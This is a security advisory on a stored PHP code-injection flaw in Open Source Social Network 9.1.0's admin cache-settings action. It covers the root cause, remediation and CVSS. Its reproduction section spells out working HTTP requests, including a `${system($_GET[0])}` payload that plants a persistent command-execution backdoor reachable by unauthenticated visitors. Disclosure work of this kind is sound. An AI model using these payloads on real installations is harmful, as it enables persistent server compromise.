# Open Source Social Network PHP Code Injection Remote Code Execution (v9.1.0)

**CWE-94 · Authenticated (site administrator) stored PHP code injection · Persistent RCE triggered by any page request**

> **Vendor:** opensource-socialnetwork (https://github.com/opensource-socialnetwork)
> **Product:** Open Source Social Network / OSSN (custom PHP + MySQL, https://github.com/opensource-socialnetwork/opensource-socialnetwork)
> **Affected version:** master branch, commit 9983ea4 (2026-09-24), latest as of 2026-09-28; self-identifies as v9.1.0.0; no fixed release
> **Affected endpoints:** POST /action/admin/dynamic/cache (equivalently POST /system/handlers/actions.php?action=admin/dynamic/cache), parameter `host` (also `port`, `username`, `password`, `type`, `status`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only harmless marker payloads (md5 markers, `whoami`); no sensitive values appear in this disclosure.

## 1. Summary

The OSSN admin action `admin/dynamic/cache` writes six administrator-supplied cache settings into the PHP configuration file `configurations/ossn.config.dcache.php` by concatenating them verbatim into a double-quoted PHP string template. The input filters (`htmlspecialchars` + `ossn_input_escape`) only escape quotes, backslash, NUL and newlines, so a quote-free `${...}` interpolation payload survives intact. Because `system/start.php` includes the config file at bootstrap on **every** request, the stored expression executes continuously — an unauthenticated visitor triggering `/index.php?0=<command>` is enough to run attacker-chosen OS commands, and the backdoor persists until an administrator rewrites the settings.

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `actions/administrator/cache/dynamic.php` | 11-17 | Six settings read via `input()` (status, type, host, port, username, password) |
| `libraries/ossn.lib.input.php` | 88 | `input()` applies `htmlspecialchars(ENT_QUOTES)` — leaves `$ { } ( ) [ ] _` untouched |
| `libraries/ossn.lib.input.php` | 19 | `ossn_input_escape()` only escapes quotes, backslash, NUL, newlines — quote-free payload passes verbatim |
| `actions/administrator/cache/dynamic.php` | 77-96 | `$template` PHP source with the six values interpolated into a **double-quoted** string |
| `actions/administrator/cache/dynamic.php` | 97 | `file_put_contents(... 'ossn.config.dcache.php', $template)` |
| `system/start.php` | 34 | `include_once(... 'ossn.config.dcache.php')` at bootstrap — executes on **every** request |

```php
// actions/administrator/cache/dynamic.php:91-97
$Ossn->dynamic_cache_settings = array(
        "status"   => "'.$status.'",
        "type"     => "'.$type.'",
        "host"     => "'.$host.'",
        ...
);';

if(file_put_contents(ossn_route()->configs . 'ossn.config.dcache.php', $template)){
```

## 3. Prerequisites

- A logged-in site administrator session with valid action tokens (`ossn_ts`/`ossn_token`, validated per action by `libraries/ossn.lib.securitytoken.php`); the action is only registered for logged-in administrators (`libraries/ossn.lib.admin.php:22-42`). OSSN's action tokens prevent classic CSRF forgery of this request.
- No privileges needed to trigger the payload after planting: any unauthenticated page hit executes it.

## 4. Reproduction

```http
POST /system/handlers/actions.php?action=admin/dynamic/cache HTTP/1.1
Cookie: PHPSESSID=<admin session>; ossn_ts=<ts>; ossn_token=<token>
Content-Type: application/x-www-form-urlencoded

status=disabled&type=&host=${print(md5(0))}&port=&username=&password=
```

Written config: `"host" => "${print(md5(0))}"`. Any page load interpolates and executes it:

```http
GET /index.php HTTP/1.1

cfcd208495d565ef66e7dff9f98764da        <- md5("0"), printed before any application HTML
```

Command execution form:

```http
POST /system/handlers/actions.php?action=admin/dynamic/cache
... host=${system($_GET[0])} ...

GET /index.php?0=whoami HTTP/1.1

<REDACTED>
```

Scripted PoC: `poc/exploit.sh` (target source: `poc/TARGET-SOURCE.txt`). Raw verification transcripts: `evidence/e01` ... `evidence/e05`.

## 5. Confirmed Techniques

- Quote-free `${...}` payload passes `htmlspecialchars(ENT_QUOTES)` and `ossn_input_escape()` unchanged and lands verbatim in the written config.
- Unauthenticated `GET /index.php` printed `md5("0")` at the start of every response — bootstrap include executes the payload.
- `host=${system($_GET[0])}`: `?0=whoami` printed the OS username; `?0=echo+...` printed attacker-chosen markers.
- Persistence: server log shows `system()` running during bootstrap of every subsequent request (admin POSTs and unauthenticated GETs) until the settings are rewritten.

## 6. Impact

One administrator-session settings save becomes a durable webserver-level backdoor: the stored code runs on every page view for every visitor, executes arbitrary OS commands from unauthenticated requests, and lives in a configuration file (survives PHP process restarts). Full loss of confidentiality, integrity and availability of the application host.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (Base 7.2 — High)

## 8. Remediation

1. Build the config with `var_export()` of cast/validated values, or store settings as JSON (`json_encode`) — never concatenate request data into PHP source.
2. Whitelist-validate `host` (hostname/IP pattern) and cast `port` to int before persisting.
3. Refuse to write values containing PHP-significant sequences (`$`, `` ` ``, `${`).
4. Keep the per-session action-token check in place.

## 9. References

- Project: https://github.com/opensource-socialnetwork/opensource-socialnetwork
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- External disclosure: https://gist.github.com/qianqiusujiu/c0452f09e91de23f002a384038325104
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
